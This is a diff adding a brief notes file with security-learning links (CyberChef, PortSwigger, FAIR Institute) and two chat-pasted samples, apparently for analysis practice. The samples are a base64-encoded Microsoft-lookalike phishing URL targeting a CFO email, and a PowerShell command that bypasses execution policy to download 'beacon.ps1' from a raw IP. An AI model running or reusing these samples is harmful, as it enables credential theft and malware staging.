@@ -1,1 +1,10 @@
+Danial Sir
 
+https://gchq.github.io/CyberChef/
+
+[3:55 pm, 10/11/2026] Gnaneshwari: aHR0cHM6Ly9taWNyb3NvZnQtbG9naW4ucmVzZXQtcGFzc3dvcmQtYXV0aC5jb20vb2F1dGgyL3ZlcmlmeT9lbWFpbD1jZm9AY29tcGFueS5jb20mdG9rZW49YTk0ZGY4OTM=
+[3:55 pm, 10/11/2026] Gnaneshwari: powershell.exe -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'http://185.220.101.5/beacon.ps1' -OutFile '$env:TEMP\update.ps1'"
+
+https://portswigger.net/web-security/all-topics
+
+https://www.fairinstitute.org/get-involved-apply-today
